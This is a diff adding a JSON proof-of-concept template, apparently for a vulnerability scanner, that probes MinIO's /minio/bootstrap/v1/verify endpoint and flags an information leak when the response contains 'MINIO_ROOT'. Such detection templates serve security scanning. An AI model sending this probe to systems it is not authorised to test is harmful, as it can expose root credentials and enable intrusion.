@@ -1,0 +1,15 @@
+{
+	"name":"Minio-verify信息泄露",
+	"tag":"Minio",
+	"type":"other",
+	"poc":{
+		"pocGet":"/minio/bootstrap/v1/verify",
+		"pocPost":"",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"(MINIO_ROOT)"
+	}
+}
